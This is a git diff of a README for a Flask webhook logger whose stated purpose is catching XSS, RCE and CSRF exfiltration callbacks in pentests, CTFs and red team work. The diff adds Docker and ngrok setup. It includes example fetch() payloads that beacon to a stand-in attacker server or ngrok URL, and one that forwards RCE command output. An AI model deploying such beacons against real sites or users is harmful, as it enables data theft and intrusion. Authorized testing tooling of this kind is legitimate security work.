@@ -1,48 +1,70 @@
 # Webhook Logger with Auto-Refresh Log Viewer
 
-This Flask app acts as a simple webhook endpoint for logging incoming HTTP requests — perfect for XSS, RCE, CSRF payload capture during pentests or CTFs.
+This Flask-based webhook logger captures incoming HTTP requests and provides a real-time, scrollable interface to view logs. It's designed for testing XSS, RCE, CSRF payloads during penetration testing or CTF exercises.
 
 It provides:
 - `/log` – accepts POST/GET data and logs it
-- `/view` – a responsive, scrollable web UI to view logs (auto-refreshes every 5s)
+- `/view` – scrollable, auto-refreshing web UI for reviewing logs
 
 ---
 
 ## Features
 
-- Logs stored in `logs/payloads.log`
-- Auto-refresh every 5 seconds
-- Scrollable UI to handle long logs
-- CORS-compatible
-- Great for XSS/RCE exfil testing
+- Stores logs in `logs/payloads.log`
+- Auto-refreshes every 5 seconds
+- Scrollable log view for long sessions
+- Compatible with CORS
+- Ideal for XSS, RCE, and CSRF data exfiltration testing
 
 ---
 
-## Requirements
+## Manual Setup
+
+### Requirements
 
 - Python 3.x
 - Flask
 
-Install with:
+Install dependencies:
 
 ```bash
 pip install flask flask-cors
 ```
 
----
-
-## Usage
+Run the server manually:
 
 ```bash
 python webhook.py
 ```
 
-- Webhook POST endpoint: [http://localhost:8080/log](http://localhost:8080/log)
-- Log viewer UI: [http://localhost:8080/view](http://localhost:8080/view)
+Server will start on: [http://localhost:8080](http://localhost:8080)
 
 ---
 
-## Remote Access via Ngrok (Expose to Internet)
+## Docker Setup
+
+Build and run using Docker:
+
+```bash
+docker build -t webhook-logger ./app
+docker run -d -p 8080:8080 --name webhook_logger webhook-logger
+```
+
+Or use Docker Compose (recommended):
+
+```bash
+docker compose up --build
+```
+
+Accessible at:
+- Webhook endpoint: [http://localhost:8080/log](http://localhost:8080/log)
+- Viewer: [http://localhost:8080/view](http://localhost:8080/view)
+
+Logs are saved in `./app/logs/payloads.log` (persisted via volume).
+
+---
+
+## Remote Access via Ngrok
 
 To expose your local Flask server publicly using Ngrok:
 
@@ -50,7 +72,7 @@ To expose your local Flask server publicly using Ngrok:
 docker run --rm -it --network=host -e NGROK_AUTHTOKEN=Your-AUth-Token ngrok/ngrok http 8080
 ```
 
-Then use the generated Ngrok URL in your XSS payloads like:
+Use the generated Ngrok URL in your payloads:
 
 ```javascript
 fetch("https://your-ngrok-url.ngrok-free.app/log", {
@@ -61,7 +83,9 @@ fetch("https://your-ngrok-url.ngrok-free.app/log", {
 
 ---
 
-## Example Payload
+## Example Payloads
+
+Send a basic XSS beacon:
 
 ```javascript
 fetch("http://your-server:8080/log", {
@@ -70,7 +94,7 @@ fetch("http://your-server:8080/log", {
 });
 ```
 
-Or exfil output from RCE:
+Exfiltrate command output (RCE scenario):
 
 ```javascript
 fetch("http://127.0.0.1:9000/internal/exec", {
@@ -88,17 +112,20 @@ fetch("http://127.0.0.1:9000/internal/exec", {
 
 ## Log File
 
-All data is saved in:
+All captured data is saved in:
 ```
 logs/payloads.log
 ```
+
+View logs in the browser via `/view` or monitor the file directly.
 
 ---
 
 ## Notes
 
-- You can tunnel this using `ngrok` to receive data from remote browsers.
-- Default port is `8080`, change as needed in `app.run()`.
+- You can use Ngrok to make the webhook reachable from the internet.
+- Adjust `app.run()` if you want to change the default port from `8080`.
+- Auto-refresh interval and scroll height can be configured in the HTML template.
 
 ---
 
@@ -106,4 +133,4 @@ logs/payloads.log
 
 **w01f**
 
-Custom-built for payload exfiltration labs, CTF chains, and Red Team automation.
+Built for use in CTFs, Red Team operations, and custom payload exfiltration scenarios.
